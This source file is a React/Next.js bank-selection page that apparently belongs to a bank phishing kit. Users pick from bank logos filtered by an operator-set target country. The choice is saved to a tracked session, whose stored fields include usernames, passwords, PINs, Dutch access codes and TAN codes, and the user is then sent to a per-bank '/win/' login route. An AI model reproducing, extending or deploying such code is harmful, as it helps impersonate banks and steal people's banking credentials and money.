"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    setBanks(initialBanks);
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      setBanks(
        data.banks.map((bank: any) => ({
          slug: bank.slug,
          name: bank.name,
          domain: bank.domain,
          logoFile: bank.logoFile ?? bank.logo_file,
          country: bank.country,
          isActive: bank.isActive !== false && bank.is_active !== false,
        })),
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      /* ignore transient refresh errors */
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
    let validBanks = banks.filter(b => b.isActive !== false);
    
    if (settings.target_country && settings.target_country !== "All") {
      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    return validBanks.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: bank.logoFile,
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace("/banken");
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;

    const selectionVersion = selectionVersionRef.current + 1;
    selectionVersionRef.current = selectionVersion;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const nextFormData: Record<string, any> = {
      ...sessionFormData,
      bankSlug: nextBankSlug,
      bankName: displayName,
    };
    
    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
    const bankSpecificFields = [
      "username", "password", "verfuegernummer", "pin", "rekeningnummer", 
      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
    ];
    for (const field of bankSpecificFields) {
      delete nextFormData[field];
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "bank",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
      return;
    }

    setSaving(false);
    if (error) {
      navigationLockRef.current = false;
      setMsg("Saving failed.");
    }
    else {
      setSessionFormData(nextFormData);
      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
    }
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
          <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
            <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
            <p className="text-sm text-gray-300 mb-8">Restoring session...</p>
            <div className="flex justify-center py-12">
              <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
          <p className="text-sm text-gray-300 mb-6">Invalid link.</p>
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Use the full link to continue.
          </p>
        </div>
      </div>
    );
  }

  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-2 pt-[14vh] sm:p-4 sm:pt-[24vh]">
      <div className="space-y-3 w-full max-w-[550px] relative z-10">
        <div className="rounded-[20px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_30px_rgba(0,102,204,0.3)] p-3 sm:p-5">
          <div className="text-center mb-3">
            <h2 className="text-lg font-bold text-white sm:text-xl">{settings.banken_title}</h2>
            <p className="text-[11px] text-gray-300 mt-0.5 font-medium sm:text-xs">{settings.banken_subtitle}</p>
          </div>
          
          <div className="mx-auto mb-3 max-w-[400px]">
            <div className="flex items-center gap-1.5 rounded-lg border border-transparent bg-white/10 px-2.5 py-1.5 shadow-sm focus-within:border-[#0066CC] focus-within:ring-1 focus-within:ring-[#0066CC]/50 transition-colors">
              <svg aria-hidden viewBox="0 0 24 24" className="h-3.5 w-3.5 text-gray-400" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-[13px] text-white outline-none placeholder:text-gray-400"
              />
            </div>
          </div>

          <div className="max-h-[55vh] sm:max-h-[40vh] overflow-y-auto pr-1.5 custom-scrollbar">
            <div className="grid grid-cols-2 gap-2 sm:gap-1.5 lg:grid-cols-3 pb-1">
              {filteredOptions.length === 0 ? (
                <div className="col-span-2 lg:col-span-3 rounded-xl border border-white/10 bg-white/5 p-4 text-center text-sm text-gray-200">
                  No banks were found for the selected country. Choose another country or clear the search filter.
                </div>
              ) : filteredOptions.map((opt, idx) => (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving}
                  className={`group flex aspect-[4/3] sm:aspect-[16/9] w-full flex-col items-center justify-between rounded-lg border border-white/10 bg-white/5 p-2 sm:p-1.5 text-center shadow-sm transition-all duration-300 hover:scale-[1.02] hover:bg-white/10 hover:border-white/20 ${
                    bankSlug === opt.slug ? "ring-1 ring-[#0066CC] bg-white/10" : ""
                  }`}
                >
                  <div className="flex flex-1 items-center justify-center mt-0.5">
                    <img
                      src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 80, width: 128 }) || opt.logoFile}
                      alt={opt.displayName}
                      className="h-8 w-8 sm:h-6 sm:w-6 lg:h-8 lg:w-8 object-contain rounded"
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = 'none';
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = 'grid';
                      }}
                    />
                    <div className="hidden h-8 w-8 sm:h-6 sm:w-6 lg:h-8 lg:w-8 place-items-center rounded-lg bg-gradient-to-br from-[#1a1a1a] to-[#2d2d2d] text-base sm:text-sm lg:text-base font-bold text-white shadow-[0_2px_8px_rgba(0,0,0,0.15)] border border-white/10 relative overflow-hidden">
                      <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/10 to-transparent"></div>
                      <span className="relative z-10 drop-shadow-md">{opt.displayName.charAt(0)}</span>
                    </div>
                  </div>
                  <div className="flex h-8 sm:h-6 w-full items-center justify-center">
                    <p className="line-clamp-2 text-[12px] sm:text-[10px] lg:text-[11px] font-medium text-white/90 group-hover:text-white leading-tight">
                      {opt.displayName}
                    </p>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>

        {msg ? <p className="text-center text-sm text-red-400 bg-black/40 p-2 rounded-xl backdrop-blur-sm border border-red-500/20">{msg}</p> : null}
      </div>
    </div>
  );
}
